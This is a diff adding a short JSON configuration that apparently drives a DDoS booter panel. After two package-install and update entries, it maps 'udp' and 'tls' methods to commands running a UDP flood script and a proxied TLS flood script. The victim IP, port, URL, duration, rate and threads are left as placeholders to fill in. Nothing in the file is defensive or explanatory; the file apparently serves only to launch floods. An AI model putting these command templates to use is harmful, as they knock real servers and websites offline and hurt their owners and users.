@@ -1,0 +1,6 @@
+{
+  "python": "apt install python -y",
+  "update": "apt update -y && apt upgrade -y",
+  "udp": "python killer.py -i {{ip}} -p {{port}} -t {{time}}",
+  "tls": "node tls.js {url} {time} {rate} {thread} proxy.txt"
+}
